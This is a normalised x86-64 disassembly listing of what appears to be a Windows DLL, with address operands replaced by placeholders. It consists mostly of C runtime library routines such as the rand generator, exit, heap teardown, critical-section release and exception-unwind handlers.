cmp rcx [ rw-data ]
jne r-xdata
jmp sub_18000778c
rol rcx 0x10
test cx 0xffff
jne r-xdata
ror rcx 0x10
retn
j_sub_180006da4
jmp j_sub_180006da4#2
sub_180006248
push rbx
sub rsp 0x20
mov ebx ecx
call sub_180007a4c
mov [ rax + 0x1c ] ebx
add rsp 0x20
pop rbx
retn
sub_180006260
sub rsp 0x28
call sub_180007a4c
mov ecx [ rax + 0x1c ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ rax + 0x1c ] ecx
shr ecx 0x10
and ecx 0x7fff
mov eax ecx
add rsp 0x28
retn
j_sub_180006da4#2
jmp sub_180006da4
sub_180006430
xor edx edx
lea r8d [ rdx + 0xa ]
jmp sub_180009198
sub_180007420
lea rax [ r--data ]
mov [ rcx ] rax
mov rax [ rdx ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx + 0x8 ] rax
mov rax rcx
retn
sub_18000743c
cmp [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
cmovne rax [ rcx + 0x8 ]
retn
sub_1800074ac
push rbx
sub rsp 0x20
cmp [ rcx + 0x10 ] 0x0
mov rbx rcx
je r-xdata
and [ rbx + 0x8 ] 0x0
mov [ rbx + 0x10 ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rcx + 0x8 ]
call sub_180006da4
sub_180007548
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_1800074ac
sub_180007594
push rbx
sub rsp 0x20
and [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov [ rcx + 0x10 ] 0x0
call sub_180007504
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000776c
sub rsp 0x28
mov rax rdx
lea rdx [ rcx + 0x11 ]
lea rcx [ rax + 0x11 ]
call sub_18000c100
test eax eax
sete al
add rsp 0x28
retn
sub_1800078e4
xor eax eax
retn
sub_1800078e8
sub rsp 0x28
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x28
jmp sub_18000c23c
call [ FlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_180007db8
sub rsp 0x28
call sub_180007cac
neg rax
sbb eax eax
neg eax
dec eax
add rsp 0x28
retn
sub_180007dd0
mov [ rw-data ] rcx
retn
sub_180008c10
mov [ rw-data ] rcx
retn
sub_1800099e8
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov ecx 0xfffffffd
call sub_180009808
mov [ rw-data ] 0x1
sub_180009df0
sub rsp 0x28
mov r8 [ r9 + 0x38 ]
mov rcx rdx
mov rdx r9
call sub_180009d8c
mov eax 0x1
add rsp 0x28
retn
sub_18000a1d8
xor eax eax
test rdx rdx
je r-xdata
retn
cmp [ rcx ] 0x0
je r-xdata
inc rax
inc rcx
cmp rax rdx
jb r-xdata
sub_18000a628
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18000a5ec
mov ecx ebx
call [ ExitProcess@IAT ]
sub_18000a640
mov ecx 0x8
jmp sub_18000c3c4
sub_18000a64c
mov ecx 0x8
jmp sub_18000c2c4
sub_18000a94c
xor r8d r8d
lea edx [ r8 + 0x1 ]
jmp sub_18000a7bc
sub_18000a958
xor edx edx
xor ecx ecx
lea r8d [ rdx + 0x1 ]
jmp sub_18000a7bc
sub_18000a968
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18000b7d0
mov ecx ebx
call sub_18000b570
xor r8d r8d
mov ecx 0xff
lea edx [ r8 + 0x1 ]
call sub_18000a7bc
int3
sub_18000b28c
sub rsp 0x28
mov rcx [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
add rsp 0x28
retn
sub_18000b47c
mov eax 0xe06d7363
cmp ecx eax
jne r-xdata
xor eax eax
retn
mov ecx eax
jmp sub_18000b2ac
sub_18000b814
lea rax [ rw-data ]
retn
sub_18000b8fc
sub rsp 0x28
call sub_18000be38
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
add rsp 0x28
jmp sub_180006da4
call sub_18000e2d8
sub_18000ba08
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
jmp [ LeaveCriticalSection@IAT ]
btr [ rdx + 0x18 ] 0xf
add ecx 0x10
jmp sub_18000c2c4
sub_18000ba40
sub rsp 0x4d8
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] rsp
mov [ rsp + 0x28 ] r8
call RtlUnwindEx
add rsp 0x4d8
retn
sub_18000ba90
retn
sub_18000baa0
retn
sub_18000baa4
sub rsp 0x28
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x1c ]
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
or eax 0xffffffff
jmp r-xdata
add rsp 0x28
retn
sub_18000be38
mov ecx 0x1
jmp sub_18000bd4c
sub_18000c1a8
sbb rax rax
sbb rax 0xffffffffffffffff
retn
sub_18000c1b0
and [ rw-data ] 0x0
retn
sub_18000c2c4
movsxd rcx ecx
lea rax [ rw-data ]
add rcx rcx
mov rcx [ rax + rcx * 8 ]
jmp [ LeaveCriticalSection@IAT ]
sub_18000ceec
mov rcx [ rw-data ]
xor eax eax
or rcx 0x1
cmp [ rw-data ] rcx
sete al
retn
sub_18000d0c8
sub rsp 0x38
and [ rsp + 0x20 ] 0x0
call sub_18000cf04
add rsp 0x38
retn
sub_18000db5e
add rsp 0x28
retn
sub_18000db84
add rsp 0x28
retn
sub_18000db8c
sub rsp 0x28
lea rcx [ sub_18000db40 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_18000dbac
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
retn
sub_18000dbcc
mov rcx [ rw-data ]
jmp [ DecodePointer@IAT ]
sub_18000de10
mov [ rw-data ] rcx
retn
sub_18000de18
mov [ rw-data ] rcx
retn
sub_18000de9c
mov edx ecx
mov r9d 0x4
xor r8d r8d
xor ecx ecx
jmp sub_18000de20
sub_18000e210
mov rax rcx
movzx edx [ rax ]
add rax 0x2
test dx dx
jne r-xdata
sub rax rcx
sar rax 0x1
dec rax
retn
sub_18000e54c
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
lea rcx [ rax + rdx + 0x10 ]
jmp [ LeaveCriticalSection@IAT ]
sub_18000e820
xor r9d r9d
jmp sub_18000e6a8
sub_18000e828
mov ecx 0x2
jmp sub_18000a968
sub_18000e874
sub rsp 0x48
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
mov r8d 0x3
lea rcx [ r--data ]
xor r9d r9d
mov edx 0x40000000
mov [ rsp + 0x20 ] r8d
call [ CreateFileW@IAT ]
mov [ rw-data ] rax
add rsp 0x48
retn
sub_18000e8b0
sub rsp 0x28
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
add rsp 0x28
retn
cmp rcx 0xfffffffffffffffe
je r-xdata
call [ CloseHandle@IAT ]
RtlVirtualUnwind
jmp [ RtlVirtualUnwind@IAT ]
RtlLookupFunctionEntry
jmp [ RtlLookupFunctionEntry@IAT ]
RtlPcToFileHeader
jmp [ RtlPcToFileHeader@IAT ]
RtlUnwindEx
jmp [ RtlUnwindEx@IAT ]
j_sub_180010edc
jmp sub_180010edc
sub_180011118
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180007a4c
mov [ rax + 0x128 ] rbx
add rsp 0x20
pop rbx
retn
sub_180011134
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180007a4c
mov [ rax + 0x130 ] rbx
add rsp 0x20
pop rbx
retn
sub_180011790
movsd xmm0 [ rcx ]
comisd xmm0 [ r--data ]
jb r-xdata
xor eax eax
retn
mov eax 0x1
retn
sub_1800117ec
xor r9d r9d
jmp sub_1800117a8
sub_1800117f4
xor edx edx
jmp sub_180011670
sub_1800117fc
xor edx edx
jmp sub_1800116f0
sub_18001234c
sub rsp 0x48
mov eax [ rsp + 0x78 ]
and [ rsp + 0x30 ] 0x0
mov [ rsp + 0x28 ] eax
mov eax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] eax
call sub_1800122b4
add rsp 0x48
retn
sub_1800123fc
mov r8 [ rdx ]
jmp sub_180012370
sub_180012404
sub rsp 0x28
movsxd r9 [ r8 + 0x1c ]
mov rax [ rcx ]
mov r10 r8
mov eax [ r9 + rax ]
cmp eax 0xfffffffe
jne r-xdata
add rsp 0x28
retn
mov r8 [ rdx ]
mov rcx r10
call sub_180012370
sub_1800124a0
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_180007548
sub_180012827
call sub_18000db40
sub_180012d20
call sub_18000db40
sub_180012dde
call sub_18000db40
sub_1800135c0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180007594
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180013d30
mov rax [ rsp ]
mov [ rcx ] rax
retn
sub_180013d38
neg rcx
sbb eax eax
and eax 0x1
retn
sub_180015e20
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x40 ] 0x0
jne r-xdata
add rsp 0x20
pop rbp
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_1800078e8
nop
sub_180015e46
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_18000b47c
nop
add rsp 0x20
pop rbp
retn
sub_180015e64
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x30 ]
call sub_18000b9bc
nop
add rsp 0x20
pop rbp
retn
sub_180015e7e
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_18000c2c4
nop
add rsp 0x20
pop rbp
retn
sub_180015e9e
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_18000c2c4
nop
add rsp 0x20
pop rbp
retn
sub_180015eb9
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18000a64c
nop
add rsp 0x20
pop rbp
retn
sub_180015ecf
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_18000c2c4
nop
add rsp 0x20
pop rbp
retn
sub_180015eea
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_18000c2c4
nop
add rsp 0x20
pop rbp
retn
sub_180015f05
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x80 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
mov ecx 0x8
call sub_18000c2c4
nop
sub_180015f29
push rbp
sub rsp 0x20
mov rbp rdx
movsxd rcx [ rbp + 0x20 ]
mov rax rcx
mov rdx [ rw-data ]
mov rdx [ rdx + rcx * 8 ]
call sub_18000ba08
nop
add rsp 0x20
pop rbp
retn
sub_180015f59
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_18000c2c4
nop
add rsp 0x20
pop rbp
retn
sub_180015f74
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xe
call sub_18000c2c4
nop
add rsp 0x20
pop rbp
retn
sub_180015f8f
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
nop
add rsp 0x20
pop rbp
retn
sub_180015fad
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx [ rbp + 0x50 ]
call sub_18000e54c
nop
add rsp 0x20
pop rbp
retn
sub_180015fd0
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000005
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
sub_180015ff2
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x60 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
xor ecx ecx
call sub_18000c2c4
nop
sub_180016010
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_18000c2c4
nop
add rsp 0x20
pop rbp
retn
sub_18001602b
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xa
call sub_18000c2c4
nop
add rsp 0x20
pop rbp
retn
sub_180016046
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx [ rbp + 0x40 ]
call sub_18000e54c
nop
add rsp 0x20
pop rbp
retn
sub_18001605f
lea rcx [ rdx + 0x80 ]
jmp sub_180005398
sub_18001606f
lea rcx [ rdx + 0x90 ]
jmp sub_180005398
sub_18001607b
mov rcx [ rdx + 0x40 ]
jmp j_sub_180006da4#2
sub_18001608b
mov rcx [ rdx + 0x40 ]
jmp j_sub_180006da4#2
sub_180016097
mov rcx [ rdx + 0xa0 ]
jmp j_sub_180006da4#2
sub_1800160a7
mov rcx [ rdx + 0xa0 ]
jmp j_sub_180006da4#2
sub_1800160b7
mov rcx [ rdx + 0xa0 ]
jmp j_sub_180006da4#2
sub_1800160c7
mov rcx [ rdx + 0xa0 ]
jmp j_sub_180006da4#2
sub_1800160d7
mov rcx [ rdx + 0xa0 ]
jmp j_sub_180006da4#2
sub_1800160e7
mov rcx [ rdx + 0xa0 ]
jmp j_sub_180006da4#2
sub_1800160f7
mov rcx [ rdx + 0xa0 ]
jmp j_sub_180006da4#2
sub_180016103
mov rcx [ rdx + 0x40 ]
add rcx 0x860
jmp sub_18000610c
sub_180016123
mov rcx [ rdx + 0x40 ]
add rcx 0x860
jmp sub_18000610c
sub_180016136
mov rcx [ rdx + 0x38 ]
jmp j_sub_180006da4#2
sub_180016146
lea rcx [ rdx + 0x20 ]
jmp sub_18000130c
sub_180016198
push rbp
sub rsp 0x20
mov rbp rdx
call sub_180012610
nop
add rsp 0x20
pop rbp
retn
sub_1800161b8
push rbp
sub rsp 0x20
mov rbp rdx
call sub_180007a4c
cmp [ rax + 0x100 ] 0x0
jle r-xdata
add rsp 0x20
pop rbp
retn
call sub_180007a4c
dec [ rax + 0x100 ]
sub_1800161e1
push rbp
sub rsp 0x20
mov rbp rdx
xor eax eax
cmp [ rbp + 0x38 ] al
setne al
add rsp 0x20
pop rbp
retn
sub_180016388
lea rax [ r--data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
jmp sub_180007548
